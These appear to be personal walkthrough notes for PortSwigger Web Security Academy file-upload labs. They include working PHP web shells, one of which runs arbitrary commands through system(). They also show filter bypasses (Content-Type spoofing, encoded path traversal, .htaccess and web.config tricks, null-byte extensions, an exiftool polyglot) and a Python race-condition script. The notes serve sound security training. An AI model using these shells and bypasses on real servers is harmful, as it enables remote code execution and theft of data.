# File upload vulnerabilities
https://portswigger.net/web-security/file-upload


<!-- Lab: Remote code execution via web shell upload -->
https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

upload file: "readsecret.php"
file content:
<?php echo file_get_contents('/home/carlos/secret'); ?> 

response:
The file avatars/readsecret.php has been uploaded.

check payload: click on avatars photo link (https://0a3a007d04e799bcc0c074d100f50014.web-security-academy.net/files/avatars/readsecret.php):

wko5q7gQI8498YshAWtYyMzhSkMJGoLP

# DUDE!

A more versatile web shell may look something like this: 
    <?php echo system($_GET['command']); ?>

pass an arbitrary system command via a query parameter 
    GET /example/exploit.php?command=id HTTP/1.1


<!-- Lab: Web shell upload via Content-Type restriction bypass -->
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

upload jpg/png file to establish base line - find and send to repeater

try to upload PHP file and watch it fails. gather clue from response about the error:
    Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.

send failed messege to repeater and change Content-Type Header from "application/x-php" to "image/png" and send again
see that no picture appears in avatar's thumbnail. open avatar picture in new tab:
qj6jFppdjbzmTHnwVljWqiW64NIn6MH2

# DUDE!

<!-- Lab: Web shell upload via path traversal -->
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

try upload "readsecret.php"  - 
get 200 OK (== no restrictions)

go to avatar link: note that script not running

try uploading to different location via path traversal change in the Content-Disposition Header:
Content-Disposition: form-data; name="avatar"; filename="../../readsecret.php"

get 200 OK and messege:
The file avatars/readsecret.php has been uploaded
server strips path traversal address.

try again with obfuscating the path traversal:
..%2f..%2freadsecret.php

get 200 OK and messege:
The file avatars/../readsecret.php has been uploaded.
- path travarsal accepted

go to file location via avater link:
https://0aaa00f60484e7fdc0c54308007e0016.web-security-academy.net/files/avatars/..%2freadsecret.php

secret:
k4NrAJFZ4eXbbjgaBVH7EtqHPfw31NZi

..%2freadsecret.php

# DUDE!


<!-- Lab: Web shell upload via extension blacklist bypass -->
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

hint:

path:
 /etc/apache2/apache2.conf

file content:
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php

file:
web.config
file content:
    <staticContent>
        <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>

Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is present. 


workthrough:

    1. uploaded web.config file:
        <staticContent>
            <mimeMap fileExtension=".zoz" mimeType="application/x-httpd-php" />
        </staticContent>

    2. uploaded php webshell with arbitary file extention .zoz:
        <?php echo file_get_contents('/home/carlos/secret'); ?> 

observed: server treats both as HTML and mark XML tags and PHP commands as remark
    1. <!--?xml version=â€™1.0â€ encoding=â€utf-8â€?-->
    2. <!--?php echo file_get_contents('/home/carlos/secret'); ?-->

lets try htaccsses way:
creat .htaccess file with content:
    AddType application/x-httpd-php .zoz 

upload both .htaccsess file and readsecret.zoz file to the same loaction
when visiting the webshell location at /file/avatars/readsecret.zoz the server treats .zoz file extension as defined by our freshly uploaded .htaccess and execute it as PHP

# DUDE!


<!-- Lab: Web shell upload via obfuscated file extension -->
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension

hints:
exploit.php.jpg - fail
exploit%2Ephp - fail
exploit.asp;.jpg - fail
exploit.asp%00.jpg - fail
exploit.p.phphp - fail

hints multibytes:
xC0 x2E
xC4 xAE
xC0 xAE
(tranlated to x2E if parsed as UTF8 --> converted to ASCII)

workthrough:
use extra suffix (.png) to pass filter and NULL byte (%00) to make server drop the extra suffix and use original suffix (.php):
readsecret.php%00.png
response: The file avatars/readsecret.php has been uploaded.

check location:
https://0a4d000b042b2ce1c07a4165009800dd.web-security-academy.net/files/avatars/readsecret.php


# DUDE!



<!-- Lab: Remote code execution via polyglot web shell upload -->
https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

install exiftool from CLI:
git clone https://github.com/exiftool/exiftool.git

(when in picture folder) use exiftool to load PHP webshell into a comment in the picture:
CLI:
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpeg -o hackerExifPolyglot.php

upload the picture and enter to itsloaction. observe the code in the first line:
����JFIFHH��MSTART eU7Y7Sakq0OzgshfIC2JkM2m5gggGqEg END��C     ����� ���}!1AQa"q2���#B��R��$3br� 

(*note the JFIF magic number indicating a JPG/JPEG file)



# DUDE!


<!-- Lab: Web shell upload via race condition -->
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

Hint
The vulnerable code that introduces this race condition is as follows:
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?> 


try to upload - failed

prepare a script to check temp location in loop:

try:
upload png file
get 200 OK

check Avatar thumbnail for file location:
https://0ad200e60315f642c0d063b5006f0035.web-security-academy.net/files/avatars/hacker.png


craft basic php webshell to read carlos secret:
readsecret.php:
<?php echo file_get_contents('/home/carlos/secret'); ?> 


try:
upload PHP webshell - failed
try: 
different techniques from previous labs - failed

prepare a pyhton script to loop-read file location:
    import requests

    burp0_url = "https://0ad200e60315f642c0d063b5006f0035.web-security-academy.net:443/"
    burp0_cookies = {"session": "T4rn1zASg1qLKDSEmeR2lZs8x7BV2hE5"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://0ad200e60315f642c0d063b5006f0035.web-security-academy.net/my-account", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

    ###########################################

    # https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

    temp_url1 = burp0_url + "files/avatars/readsecret.php"
    print(f"{burp0_url}\n{temp_url1}")


    def loop_reading():
        while True:
            response_temp1 = requests.get(temp_url1, headers=burp0_headers, cookies=burp0_cookies, proxies={"http": "http://127.0.0.1:8080"})
            print(f"location result:{response_temp1.content}\n")

    if __name__ == '__main__':
        loop_reading()

Race Against the Machine:
1. run py script - observe the 404 responses in loop
2. upload readsecret.php via repeater - observe forbidden 403
3. check py terminal  - observe py script wins race and prints carlos secret before file deleted by security

# DUDE!

